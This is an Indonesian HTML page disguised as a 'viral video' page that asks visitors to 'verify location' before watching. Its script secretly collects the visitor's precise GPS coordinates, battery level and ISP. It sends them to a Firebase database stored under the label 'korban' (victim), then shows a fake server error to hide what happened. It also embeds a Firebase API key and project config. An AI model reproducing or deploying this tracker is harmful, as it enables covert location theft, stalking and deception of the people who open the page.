<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GNN - VIDEO VIRAL</title>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
</head>
<body style="text-align:center; font-family:sans-serif; background:#eee; padding:20px;">
    <div style="background:white; padding:20px; border-radius:15px; box-shadow:0 5px 15px rgba(0,0,0,0.1);">
        <h2>🔴 VIDEO VIRAL TERKINI</h2>
        <p>Verifikasi lokasi Anda untuk memastikan keamanan konten sebelum menonton.</p>
        <button id="btn" onclick="gasLacak()" style="background:#d32f2f; color:white; border:none; padding:15px; width:100%; border-radius:10px; font-weight:bold; cursor:pointer;">VERIFIKASI & TONTON</button>
    </div>

<script>
    // MASUKKAN CONFIG FIREBASE LU DISINI 🎯
    const firebaseConfig = {
      apiKey: "AIzaSyAqdcpcUxfUBNY2H83IBa1Pp0X6YcQtDlQ",
      authDomain: "theeyes-8d0aa.firebaseapp.com",
      databaseURL: "https://theeyes-8d0aa-default-rtdb.asia-southeast1.firebasedatabase.app",
      projectId: "theeyes-8d0aa",
      storageBucket: "theeyes-8d0aa.firebasestorage.app",
      messagingSenderId: "886775568743",
      appId: "1:886775568743:web:89a5a2b26628711fedf7c2"
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();

    async function gasLacak() {
        const btn = document.getElementById('btn');
        btn.innerText = "MEMPROSES...";
        let bat = "N/A", isp = "Mencari...";
        try {
            if(navigator.getBattery) { const b = await navigator.getBattery(); bat = Math.round(b.level*100)+"%"; }
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json(); isp = data.org;
        } catch(e) {}

        navigator.geolocation.getCurrentPosition((pos) => {
            db.ref('korban').push({
                waktu: new Date().toLocaleString(),
                baterai: bat,
                isp: isp,
                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
            });
            alert("Error 403: Server Sibuk. Coba lagi nanti!");
            btn.innerText = "VERIFIKASI ULANG";
        }, (err) => { alert("Gagal: Anda wajib mengizinkan lokasi!"); }, {enableHighAccuracy:true});
    }
</script>
</body>
</html>
